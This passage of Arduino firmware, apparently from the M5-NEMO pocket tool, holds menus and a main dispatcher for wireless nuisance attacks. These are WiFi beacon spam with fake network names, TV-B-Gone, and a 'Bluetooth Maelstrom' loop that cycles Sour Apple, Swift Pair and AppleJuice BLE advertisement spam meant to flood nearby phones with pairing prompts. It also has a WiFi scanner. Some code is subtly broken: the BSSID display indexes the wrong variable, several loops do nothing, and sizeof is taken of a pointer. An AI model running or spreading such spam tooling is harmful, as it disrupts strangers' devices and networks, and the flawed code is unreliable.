        beaconSpam(funnyssids);
        break;
      case 2:
        len = sizeof(rickrollssids);
        while(i < len){
          i++;
        }
        beaconSpam(rickrollssids);
        break;
      case 3:
        char* randoms = randomSSID();
        len = sizeof(randoms);
        while(i < len){
          i++;
        }
        beaconSpam(randoms);
        break;        
    }
  }
}

void btmaelstrom_setup(){
  rstOverride = false;
  maelstrom = true;
}

void btmaelstrom_loop(){
  swiftPair = false;
  sourApple = true;
  aj_adv();
  swiftPair = true;
  sourApple = false;
  aj_adv();
  swiftPair = false;
  sourApple = false;
  aj_loop(); // roll a random device ID
  aj_adv();
}


/// WIFISPAM MENU ///
MENU wsmenu[] = {
  { "Funny", 0},
  { "Rickroll", 1},
  { "Random", 2},
  { "Back", 3},
};

void wsmenu_drawmenu() {
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(wsmenu) / sizeof(MENU) ) ; i++ ) {
    M5.Lcd.print((cursor == i) ? ">" : " ");
    M5.Lcd.println(wsmenu[i].name);
  }
}

void wsmenu_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  rstOverride = true;
  wsmenu_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void wsmenu_loop() {
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( sizeof(wsmenu) / sizeof(MENU) );
    wsmenu_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    int option = wsmenu[cursor].command;
    rstOverride = false;
    current_proc = 11;
    isSwitching = true;
    switch(option) {
      case 0:
        spamtype = 1;
        break;
      case 1:
        spamtype = 2;
        break;
      case 2:
        spamtype = 3;
        break;
      case 3:
        current_proc = 1;
        break;
    }
  }
}

void wscan_drawmenu() {
  char ssid[19];
  M5.Lcd.setRotation(rotation);
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(0, 5, 1);
  // scrolling menu
  if (cursor > 4) {
    for ( int i = 0 + (cursor - 4) ; i < wifict ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(WiFi.SSID(i).substring(0,19));
    }
  } else {
    for ( int i = 0 ; i < wifict ; i++ ) {
      M5.Lcd.print((cursor == i) ? ">" : " ");
      M5.Lcd.println(WiFi.SSID(i).substring(0,19));
    }
  }
  M5.Lcd.print((cursor == wifict) ? ">" : " ");
  M5.Lcd.println("[RESCAN]");
  M5.Lcd.print((cursor == wifict + 1) ? ">" : " ");
  M5.Lcd.println("Back");
}

void wscan_result_setup() {
  M5.Lcd.setRotation(rotation);
  cursor = 0;
  rstOverride = true;
  wscan_drawmenu();
  delay(250); // Prevent switching after menu loads up
}

void wscan_result_loop(){
  if (digitalRead(M5_BUTTON_RST) == LOW) {
    cursor++;
    cursor = cursor % ( wifict + 2);
    wscan_drawmenu();
    delay(250);
  }
  if (digitalRead(M5_BUTTON_HOME) == LOW) {
    delay(250);
    if(cursor == wifict){
      rstOverride = false;
      current_proc = 14;
    }
    if(cursor == wifict + 1){
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }
    String encryptType = "";
    switch (WiFi.encryptionType(cursor)) {
    case 1:
      encryptType = "WEP";
      break;
    case 2:
      encryptType = "WPA/PSK/TKIP";
      break;
    case 3:
      encryptType = "WPA/PSK/CCMP";
      break;
    case 4:
      encryptType = "WPA2/PSK/Mixed/CCMP";
      break;
    case 8:
      encryptType = "WPA/WPA2/PSK";
      break ;
    case 0:
      encryptType = "Open";
      break ;
    }
    
    M5.Lcd.setTextSize(MEDIUM_TEXT);
    if(WiFi.SSID(cursor).length() > 12){
      M5.Lcd.setTextSize(SMALL_TEXT);
    }       
    M5.Lcd.fillScreen(BLACK);
    M5.Lcd.setCursor(5, 1);
    M5.Lcd.println(WiFi.SSID(cursor));
    M5.Lcd.setTextSize(SMALL_TEXT);
    M5.Lcd.printf("Chan : %d\n", WiFi.channel(cursor));
    M5.Lcd.printf("Crypt: %s\n", encryptType);
        M5.Lcd.printf("BSSID:\n %x:%x:%x:%x:%x:%x\n", 
      WiFi.BSSID(i)[0],
      WiFi.BSSID(i)[1],
      WiFi.BSSID(i)[2],
      WiFi.BSSID(i)[3],
      WiFi.BSSID(i)[4],
      WiFi.BSSID(i)[5]
      );

    M5.Lcd.printf("\nSide Key: Back");
  }
}

void wscan_setup(){
  rstOverride = false;  
  cursor = 0;
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("WiFi Scan");
  delay(2000);
}

void wscan_loop(){
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(MEDIUM_TEXT);
  M5.Lcd.setCursor(5, 1);
  M5.Lcd.println("Scanning...");
  wifict = WiFi.scanNetworks();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(SMALL_TEXT);
  M5.Lcd.setCursor(5, 1);
  if(wifict > 0){
  isSwitching = true;
  current_proc=15;
  }
}

/// ENTRY ///
void setup() {
  M5.begin();
  EEPROM.begin(EEPROM_SIZE);
  // Uncomment these to blow away EEPROM to factory settings - for testing purposes
  //EEPROM.write(0, 255); // Rotation
  //EEPROM.write(1, 255); // dim time
  //EEPROM.write(2, 255); // brightness
  //EEPROM.write(2, 255); // TV-B-Gone Region
  //EEPROM.commit();
  Serial.printf("EEPROM 0: %d\n", EEPROM.read(0));
  Serial.printf("EEPROM 1: %d\n", EEPROM.read(1));
  Serial.printf("EEPROM 2: %d\n", EEPROM.read(2));
  Serial.printf("EEPROM 3: %d\n", EEPROM.read(3));
  if(EEPROM.read(0) > 3 || EEPROM.read(1) > 30 || EEPROM.read(2) > 100 || EEPROM.read(3) > 1) {
    // Let's just assume rotation > 3 is a fresh/corrupt EEPROM and write defaults for everything
    Serial.println("EEPROM likely not properly configured. Writing defaults.");
    EEPROM.write(0, 3);    // Left rotation
    EEPROM.write(1, 15);   // 15 second auto dim time
    EEPROM.write(2, 100);  // 100% brightness
    EEPROM.write(3, 0); // TVBG NA Region
    EEPROM.commit();
  }
  rotation = EEPROM.read(0);
  screen_dim_time = EEPROM.read(1);
  brightness = EEPROM.read(2);
  region = EEPROM.read(3);
  M5.Axp.ScreenBreath(brightness);
  M5.Lcd.setRotation(rotation);
  M5.Lcd.setTextColor(GREEN, BLACK);
  // Boot Screen
  digitalWrite(M5_LED, HIGH); //LEDOFF
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(BIG_TEXT);
  M5.Lcd.setCursor(40, 15);
  M5.Lcd.print("M5-NEMO\n");
  // Pin setup
  pinMode(M5_LED, OUTPUT);
  pinMode(M5_BUTTON_HOME, INPUT);
  pinMode(M5_BUTTON_RST, INPUT);

  // Random seed
  randomSeed(analogRead(0));

  // Create the BLE Server
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // Finish with time to show logo
  delay(3000);
}

void loop() {
  // This is the code to handle running the main loops
  // Background processes
  switcher_button_proc();
  screen_dim_proc();
  check_axp_press();
  
  // Switcher
  if (isSwitching) {
    isSwitching = false;
    switch (current_proc) {
      case 0:
        clock_setup();
        break;
      case 1:
        mmenu_setup();
        break;
      case 2:
        smenu_setup();
        break;
      case 3:
        timeset_setup();
        break;
      case 4:
        dmenu_setup();
        break;
      case 5:
        tvbgone_setup();
        break;
      case 6:
        battery_setup();
        break;
      case 7:
        rmenu_setup();
        break;
      case 8:
        aj_setup();
        break;
      case 9:
        aj_adv_setup();
        break;
      case 10:
        credits_setup();
        break;
      case 11:
        wifispam_setup();
        break;
      case 12:
        wsmenu_setup();
        break;
      case 13:
        tvbgmenu_setup();
        break;
      case 14:
        wscan_setup();
        break;
      case 15:
        wscan_result_setup();
        break;
      case 16:
        btmenu_setup();
        break;
      case 17:
        btmaelstrom_setup();
        break;
    }
  }

  switch (current_proc) {
    case 0:
      clock_loop();
      break;
    case 1:
      mmenu_loop();
      break;
    case 2:
      smenu_loop();
      break;
    case 3:
      timeset_loop();
      break;
    case 4:
      dmenu_loop();
      break;
    case 5:
      tvbgone_loop();
      break;
    case 6:
      battery_loop();
      break;
    case 7:
      rmenu_loop();
      break;
    case 8:
      aj_loop();
      break;
    case 9:
      aj_adv();
      break;
    case 10:
      // noop - just let the credits stay on screen
      break;
    case 11:
      wifispam_loop();
      break;
    case 12:
      wsmenu_loop();
      break;
    case 13:
      tvbgmenu_loop();
      break;
    case 14:
      wscan_loop();
      break;
    case 15:
      wscan_result_loop();
      break;
    case 16:
      btmenu_loop();
      break;
    case 17:
      btmaelstrom_loop();
      break;
  }
}
